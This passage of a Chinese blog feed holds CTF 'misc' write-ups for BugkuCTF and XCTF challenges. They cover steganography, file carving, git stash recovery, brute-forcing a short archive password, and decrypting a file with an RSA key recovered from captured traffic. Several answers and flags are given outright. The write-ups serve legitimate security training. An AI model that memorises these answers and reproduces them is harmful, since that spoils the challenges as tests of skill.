        <content type="html"><![CDATA[<h2 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h2><p>（1）附件是一个后缀名为bin的文件，用路由器密码备份文件RouterPassView打开<br><img src="https://img-blog.csdnimg.cn/20201030223405664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）根据提示flag为宽带用户名，在RouterPassView中用Ctrl+F搜索username，即为flag<br><img src="https://img-blog.csdnimg.cn/20201030223420108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h2><p>（1）附件是一张.jpg图片，用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201030223453487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030223505673.png#pic_center" alt="在这里插入图片描述"><br>（2）确认以FF D8开头后，查找结尾FF D9，发现了一个压缩包<br><img src="https://img-blog.csdnimg.cn/2020103022354151.png#pic_center" alt="在这里插入图片描述"><br>（3）该图片后缀名为zip，解压，得到提示.jpg和flag.rar，查看提示，flag.rar的解压密码为3位数<br><img src="https://img-blog.csdnimg.cn/2020103022360534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>4）用暴力破解工具破解密码，得到密码为871，成功解压flag.rar，得到一张图片<br><img src="https://img-blog.csdnimg.cn/20201030223633765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030223640406.png#pic_center" alt="在这里插入图片描述"><br>（5）用notepad++打开图片，发现被加密的flag，用base64解码得到真正的flag内容<br><img src="https://img-blog.csdnimg.cn/20201030223716672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="多种方法解决"><a href="#多种方法解决" class="headerlink" title="多种方法解决"></a>多种方法解决</h2><p>（1）附件解压后是一个exe文件，无法打开，放到notepad++里分析，发现一串base64编码的字符串<br><img src="https://img-blog.csdnimg.cn/20201030223745276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）根据题目提示，解题过程中会得到一个二维码图片，用在线工具把base64还原为图片<br><img src="https://img-blog.csdnimg.cn/20201030223801887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020103022380953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）用二维码扫描器打开，得到flag</p><h2 id="闪的好快"><a href="#闪的好快" class="headerlink" title="闪的好快"></a>闪的好快</h2><p>（1）附件是一张gif的二维码动图，用stegsolve工具打开，对其进行分解。一共18张二维码图片<br><img src="https://img-blog.csdnimg.cn/20201030223853420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）一张张保存后，用二维码扫描工具一张张扫过去，并记录在记事本里，最终得到flag<br><img src="https://img-blog.csdnimg.cn/20201030223911472.png#pic_center" alt="在这里插入图片描述"></p><h2 id="come-game"><a href="#come-game" class="headerlink" title="come_game"></a>come_game</h2><p>（1）解压后得到一个exe文件，是个游戏，进去玩一玩<br><img src="https://img-blog.csdnimg.cn/2020103022394692.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030223957648.png#pic_center" alt="在这里插入图片描述"><br>（2）发现生成了3个文件，分别用notepad++打开，发现save文件是表示关卡的意思<br><img src="https://img-blog.csdnimg.cn/20201030224015199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）将2改为3，对应的十六进制改为33，然后重新打开游戏就会跳到下一个关卡。以此类推，在第5关发现了flag，注意最后的提交格式为SYC{}<br><img src="https://img-blog.csdnimg.cn/20201030224034984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="白哥的鸽子"><a href="#白哥的鸽子" class="headerlink" title="白哥的鸽子"></a>白哥的鸽子</h2><p>（1）得到一张jpg格式的图片，用notepad++打开，在图片结尾FF D9后面发现一串特殊的字符<br><img src="https://img-blog.csdnimg.cn/20201030224108166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030224128873.png#pic_center" alt="在这里插入图片描述"><br>（2）将其十六进制数转为字符串fg2ivyo}l{2s3_o@aw__rcl@<br><img src="https://img-blog.csdnimg.cn/20201030224200744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）得到的字符使用了栅栏密码，用CTFcrackTools解码，找到flag，最后的两个@@是干扰，去掉。<br><img src="https://img-blog.csdnimg.cn/20201030224222135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>得到一个1.tar.gz的文件<br>解法一（快速）：直接用7-zip打开，直到发现flag.txt文本<br><img src="https://img-blog.csdnimg.cn/20201030224315674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>解法二:<br>（1）放到linux底下解压，tar -xvf 1.tar.gz<br><img src="https://img-blog.csdnimg.cn/20201030224351426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）查看flag里可打印的字符：strings flag    或者也可以直接查看flag里的内容cat flag<br><img src="https://img-blog.csdnimg.cn/20201030224424537.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030224431429.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030224453287.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030224500494.png#pic_center" alt="在这里插入图片描述"></p><h2 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h2><p>（1）附件是一张图片，放到notepad++里，没有发现什么有用信息<br><img src="https://img-blog.csdnimg.cn/20201030224538196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）再仔细查看图片，图片下面应该还有一部分，则notepad++里修改图片的高度，改为和长度一样试试<br><img src="https://img-blog.csdnimg.cn/20201030224553705.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030224601164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）看到了flag<br><img src="https://img-blog.csdnimg.cn/20201030224632724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> BugkuCTF_杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF_Misc_001</title>
      <link href="2020/11/15/BugkuCTF/BugkuCTF_Misc-001/"/>
      <url>2020/11/15/BugkuCTF/BugkuCTF_Misc-001/</url>
      
        <content type="html"><![CDATA[<h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><p>（1）解压附件，发现有一张图片，并没有有用的信息<br><img src="https://img-blog.csdnimg.cn/20201030222021275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）根据题意，flag被隐藏起来了，用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201030222050891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）红色方框部分代表的是图片的像素，也可以理解为长和高，发现图片的高度比长度小了不少，将高度修改为长度的值。<br><img src="https://img-blog.csdnimg.cn/20201030222126820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）保存后重新打开图片，发现flag<br><img src="https://img-blog.csdnimg.cn/20201030222143936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="眼见非实-ISCCCTF"><a href="#眼见非实-ISCCCTF" class="headerlink" title="眼见非实(ISCCCTF)"></a>眼见非实(ISCCCTF)</h2><p>（1）下载附件，得到一个名为zip没有后缀名的文件<br>（2）用notepad++打开，发现文件头是50 4B 03 04，说明是一个压缩文件<br><img src="https://img-blog.csdnimg.cn/20201030222246657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）修改文件后缀名为.zip，解压后得到一个文档<br><img src="https://img-blog.csdnimg.cn/20201030222313691.png#pic_center" alt="在这里插入图片描述"><br>（4）双击打开后并没有发现有用信息，再用notepad++打开，发现又是一个压缩文件<br><img src="https://img-blog.csdnimg.cn/20201030222346825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）修改后缀名为.zip，解压后得到一个文件夹<br><img src="https://img-blog.csdnimg.cn/20201030222418463.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030222429644.png#pic_center" alt="在这里插入图片描述"><br>（6）最终在word文件夹里找到flag，可用记事本或notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201030222459970.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030222507509.png#pic_center" alt="在这里插入图片描述"></p><h2 id="啊哒"><a href="#啊哒" class="headerlink" title="啊哒"></a>啊哒</h2><p>（1）打开附件，解压后得到一张.jpg图片，用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201030222548608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）文件头确实是以FF D8 开头，寻找结尾FF D9<br><img src="https://img-blog.csdnimg.cn/20201030222607981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）发现FF D9后面还有一个压缩文件，50 4B 03 04，将原来的图片改后缀名为.zip，也可以在kali下用命令foremost -t all ada.jap 分离文件。<br><img src="https://img-blog.csdnimg.cn/20201030222638392.png#pic_center" alt="在这里插入图片描述"><br>（4）解压，但发现需要密码<br><img src="https://img-blog.csdnimg.cn/20201030222716140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）查看图片属性，发现一串字符，作为密码输入，但显示密码错误<br><img src="https://img-blog.csdnimg.cn/20201030222737816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）将这串十六进制字符转为ASCII码字符，得到sdnisc_2018，将其作为解压密码，得到flag<br><img src="https://img-blog.csdnimg.cn/20201030222759359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030222809753.png#pic_center" alt="在这里插入图片描述"></p><h2 id="又一张图片，还单纯吗"><a href="#又一张图片，还单纯吗" class="headerlink" title="又一张图片，还单纯吗"></a>又一张图片，还单纯吗</h2><p>（1）附件是一张.jpg的图片，用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201030222856237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）确实以FF D8开头，寻找图片结尾FF D9，接连找到几个FF D9后，又发现了一张以FF D8开头的.jpg图片<br><img src="https://img-blog.csdnimg.cn/20201030222917608.png#pic_center" alt="在这里插入图片描述"><br>（3）用kali输入命令foremost -t -all 2.jpg分离文件，则又得到了一张图片，发现flag<br><img src="https://img-blog.csdnimg.cn/20201030222940899.png#" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/202010302230013.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030223007998.png#pic_center" alt="在这里插入图片描述"></p><h2 id="猜"><a href="#猜" class="headerlink" title="猜"></a>猜</h2><p>（1）附件是一张图片，根据提示是某人的名字，直接百度搜索图片，是刘亦菲，名字拼音即flag<br><img src="https://img-blog.csdnimg.cn/20201030223039681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030223048756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> BugkuCTF_杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Misc_004</title>
      <link href="2020/11/15/XCTF/XCTF_Misc-004/"/>
      <url>2020/11/15/XCTF/XCTF_Misc-004/</url>
      
        <content type="html"><![CDATA[<h2 id="embarrass"><a href="#embarrass" class="headerlink" title="embarrass"></a>embarrass</h2><p>（1）下载附件，是一个流量包，用wireshark打开，输入tcp contains flag，并追踪tcp流，找了很久，没有找到。<br><img src="https://i.loli.net/2020/11/15/l9KHhroMWP7OiYN.png" alt="在这里插入图片描述"><br>（2）放到kali中，用foremost分离文件，得到大量的htm文件和一张jpg图片，但没有找到flag<br><img src="https://i.loli.net/2020/11/15/KQ4ziVuqCkgvbwj.png" alt="在这里插入图片描述"><br><img src="https://i.loli.net/2020/11/15/cY5Id2ngUBJ3XFZ.png" alt="在这里插入图片描述"><br>（3）在kaili中用strings命令找到flag</p><pre><code>strings misc_02.pcapng | grep flag</code></pre><p><img src="https://i.loli.net/2020/11/15/cY5Id2ngUBJ3XFZ.png" alt="在这里插入图片描述"></p><h2 id="MISCall"><a href="#MISCall" class="headerlink" title="MISCall"></a>MISCall</h2><p>（1）下载附件，得到一个没有后缀名的文件，放到kali中binwalk一下，发现是一个bzip2类型的压缩包，为了方便，重命名一下，改为1.bzip2</p><p><img src="https://i.loli.net/2020/11/15/pMuYPblFTah97om.png" alt="image-20201115185454990"></p><p>（2）解压</p><pre><code>tar xvf 1.bzip2</code></pre><p><img src="https://i.loli.net/2020/11/15/S3n7zFvPRj6dhit.png" alt="image-20201115190744053"></p><p>（3）发现了一个flag.txt和.git文件夹，但flag.txt中没有flag。利用.git目录，git stash进行恢复以前修改/删除的文件。查看git 记录，给出了一个最近上传的文件，但这个文件并不存在</p><pre><code>git log  //查看git记录</code></pre><p><img src="https://i.loli.net/2020/11/15/5IsbF7Vqx1W8aQy.png" alt="image-20201115220941620"></p><p>（4）查看修改列表，存储列表中有一条记录</p><pre><code>git stash list   //查看修改列表</code></pre><p><img src="https://i.loli.net/2020/11/15/Zj3pUFvGExP9o6R.png" alt="image-20201115221415569"></p><p>（5）校验列表中的存储文件</p><p><img src="https://i.loli.net/2020/11/15/GE9BMlFo1pnQqv2.png" alt="image-20201115221608681"></p><p>（6）恢复上面的文件，直接执行 git stash apply 时，会提示文件覆盖自动终止，可以先把原来的flag.txt删除再执行</p><pre><code>git stash apply   //恢复文件</code></pre><p><img src="https://i.loli.net/2020/11/15/QDfqhwAg72E1UIM.png" alt="image-20201115222553488"></p><p>（7）运行s.py得到flag</p><pre><code>python s.py</code></pre><h2 id="Get-the-key-txt"><a href="#Get-the-key-txt" class="headerlink" title="Get-the-key.txt"></a>Get-the-key.txt</h2><p>（1）下载附件，得到一个压缩包，解压后是一个没有后缀名的文件，放到kali中binwalk一下查看文件类型，也可使用file命令</p><pre><code>file fileName</code></pre><p><img src="https://i.loli.net/2020/11/16/zsJpYd4Vtui18rM.png" alt="image-20201116162315709"></p><p>（2）发现是Linux的文件系统数据，在/tmp下创建forensic文件夹，并将文件挂载到该目录下</p><pre><code>mkdir /tmp/forensicmount -o loop forensic100 /tmp/forensic    //挂载</code></pre><p>（3）进入新创建的目录下，发现大量文件</p><p><img src="https://i.loli.net/2020/11/16/7S92HjkdNI3FWyJ.png" alt="image-20201116162837956"></p><p>（4）根据题目提示 get-the-key.txt，使用如下命令进行文件匹配</p><pre><code>grep -r key.txt</code></pre><p><img src="https://i.loli.net/2020/11/16/Y54CSjGl1qNLPFz.png" alt="image-20201116163043401"></p><p>（5)得到一个二进制的名为1的文件，查看其类型</p><p><img src="https://i.loli.net/2020/11/16/FAKorPwyYfG5xWs.png" alt="image-20201116163215732"></p><p>（6）是gzip压缩包，但用gunzip 1解压会出错，tar xvf 1也不行，最后使用gunzip &lt; 1得到flag：SECCON{@]NL7n+-s75FrET]vU=7Z}</p><p>（7）还有一种方法，在得知1的类型为gzip压缩文件后，修改后缀，文件名改为1.gz，然后解压</p><pre><code>gunzip 1.gz</code></pre><p>（8）解压成功，依然得到一个名为1的文件，再次查看该文件类型</p><pre><code>file 1</code></pre><p><img src="https://i.loli.net/2020/11/16/HrIy7Ua2vbnmzD5.png" alt="image-20201116165042375"></p><p>（9）是一个ASCII码的文件，用cat查看内容，得到flag</p><p><img src="https://i.loli.net/2020/11/16/JVIY64MigQ9Hdsz.png" alt="image-20201116165159099"></p><h2 id="就在其中"><a href="#就在其中" class="headerlink" title="就在其中"></a>就在其中</h2><p>（1）下载附件，得到一个流量包，用wireshark打开，搜索字符flag，但并没有任何信息</p><p>（2）将该流量包放到kali中binwalk一下，查看是否存在隐藏文件</p><p><img src="https://i.loli.net/2020/11/20/BHCYuVwWea1DPhn.png" alt="image-20201120202514449"></p><p>（3）确实存在隐藏文件，用foremost工具分离文件，得到jpg、pdf、zip三个文件夹</p><p><img src="https://i.loli.net/2020/11/20/Up1ZiB2VeNnJzuL.png" alt="image-20201120202620317"></p><p>（4）其中jpg和pdf文件夹下并没有明显的flag信息，zip下有一个压缩包，加压后得到一个文档key.txt，但却是一串奇怪的字符</p><p><img src="https://i.loli.net/2020/11/20/IjmJZKQ9RCN54ak.png" alt="image-20201120203033157"></p><p>（5）再次打开流量包，搜索key字符</p><p><img src="https://i.loli.net/2020/11/20/3EqQp7hHclIzkw5.png" alt="image-20201120204201790"></p><p>（6）可以看到先进行tcp连接，再进行ftp传输，应该是一个在传输某些文档的流量包，flag信息应该和传输的文档有关，追踪tcp流，发现了RSA私钥</p><p><img src="https://i.loli.net/2020/11/20/TYaGp3WhDRorI1M.png" alt="image-20201120205800250"></p><p>（7）将这串字符全部复制到一个文本中，命名为rsa.key，放到kali中的openssl进行解密</p><pre><code>openssl rsautl -decrypt -in key.txt -inkey rsa.key -out flag.txt// -in 为要解密的加密文档   -inkey  为密钥      -out  为输出文档</code></pre><p><img src="https://i.loli.net/2020/11/20/wdJftIDXWbpjoxV.png" alt="image-20201120210306217"></p><p>（8）查看flag.txt</p><p><img src="https://i.loli.net/2020/11/20/k21zZ48GylfohpR.png" alt="image-20201120210509016"></p><h2 id="Reverse-it"><a href="#Reverse-it" class="headerlink" title="Reverse-it"></a>Reverse-it</h2><p>（1）下载得到一个附件，用010 editor打开，但无法明显看出是什么类型的文件，再放到kali中binwalk一下，依然没有发现。</p><p>（2）根据题目Reverse-it，逆向它，再仔细观察010 editor里的十六进制编码</p><p><img src="https://i.loli.net/2020/11/22/MEG51FuCgRwp83r.png" alt="image-20201122164943736"></p><p><img src="https://i.loli.net/2020/11/22/5jTNkhSzX46lYGr.png" alt="image-20201122165014259"></p><p>（3）在文件头和文件尾发现了特殊的编码，联想jpg的图片格式，以FF D8开头，FF D9结尾。所以整个文件被倒过来了，需要再将其逆转回去。这里借助Python脚本。</p><pre><code class="python">import osf = open(&#39;1&#39;,&quot;rb&quot;)#二进制形式打开f = f.read()[::-1]for i in f:    ans = str(hex(i))[2:][::-1]    if len(ans) == 1:        ans = ans + &#39;0&#39;    print(ans,end=&#39;&#39;)</code></pre><p>（4）将得到的新文件保存并名为jpg格式，得到一张图片</p><p><img src="https://i.loli.net/2020/11/22/mzhyvHuLsipbgt8.png" alt="image-20201122165457966"></p><p>（5）可以看到是张翻转过的图片，这里可以使用windows下的画图工具将其水平翻转过来，也可以利用Python脚本。</p><pre><code class="python">from PIL import Imageim = Image.open(&quot;t.jpg&quot;)pim = im.load()an = Image.open(&quot;t.jpg&quot;)ans = an.load()for i in range(im.size[0]):    for j in range(im.size[1]):        ans[i, j] = pim[im.size[0]-i-1, j]an.show()</code></pre><p><img src="https://i.loli.net/2020/11/22/fvH2PcDKqViZsFA.png" alt="image-20201122165652047"></p><h2 id="打野"><a href="#打野" class="headerlink" title="打野"></a>打野</h2><p>（1）得到一张坤坤的bmp格式图片，放到kali中binwalk一下，并没有发现隐藏的文件。再用strings查看，同样没有得到flag的信息。最后使用kali中的zsteg工具，该工具可以检测png和bmp图片里的隐写数据。</p><pre><code>zsteg &#39;文件路径&#39;zsteg /root/Desktop/CTF/XCTF/Misc/005/瞅啥.bmp</code></pre><p><img src="https://i.loli.net/2020/11/23/K3pOT2NVXjUgEtd.png" alt="image-20201123204350799"></p><p>（2）得到flag</p><h2 id="倒立屋"><a href="#倒立屋" class="headerlink" title="倒立屋"></a>倒立屋</h2><p>（1）下载附件，得到一个png图片。放到kali下binwalk一下，发现存在zlib压缩数据</p><p><img src="https://i.loli.net/2020/11/27/fWNTdMEnOlRx2cB.png" alt="image-20201127205100279"></p><p>（2）用kali中的工具zsteg看看图片中的隐藏数据</p><p><img src="https://i.loli.net/2020/11/27/bxRwAtQX8spzrKc.png" alt="image-20201127205231331"></p><p>（3）得到字符IsCc_2019,但直接提交是错误的，根据题意，需要倒过来，所以就是flag{9102_cCsI}</p><h2 id="2017-Dating-in-Singapore"><a href="#2017-Dating-in-Singapore" class="headerlink" title="2017_Dating_in_Singapore"></a>2017_Dating_in_Singapore</h2><p>（1）下载附件，得到一份PDF文件，是2017年新加坡的日历。再看看提示，由’-‘分隔了12串数字，联想到对应的12个月。</p><p><img src="https://i.loli.net/2020/12/02/tF7KdViY8BfLwhj.png" alt="image-20201202180623816"></p><p>（2）将上述12串字符放到一个文本文档中，并分类为12行。</p><p><img src="https://i.loli.net/2020/12/02/DraloOHzsf5xWbG.png" alt="image-20201202180924011"></p><p>（3）每串数字对应一个月的日期，将其分为两两一组。</p><p><img src="https://i.loli.net/2020/12/02/4UzN7R6TObxAGec.png" alt="image-20201202181311182"></p><p>（5）对比一开始得到的PDF文件，得到HITB{CTFFUN}</p><p><img src="https://i.loli.net/2020/12/02/AfM5WVNdiwLzKt9.png" alt="image-20201202181507644"></p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Misc进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Misc_003</title>
      <link href="2020/11/15/XCTF/XCTF_Misc-003/"/>
      <url>2020/11/15/XCTF/XCTF_Misc-003/</url>
      
        <content type="html"><![CDATA[<h2 id="simple-transfer"><a href="#simple-transfer" class="headerlink" title="simple_transfer"></a>simple_transfer</h2><p>（1）下载附件，得到一个流量包，用wireshark打开，在搜索框输入tcp contains flag查找flag，并没有发现有用信息。<br><img src="https://img-blog.csdnimg.cn/20201104185840360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（2）放到kali下，用foremost分解，得到一个pdf文件，打开看到flag。<br><img src="https://img-blog.csdnimg.cn/20201104185953178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Hear-with-your-Eyes"><a href="#Hear-with-your-Eyes" class="headerlink" 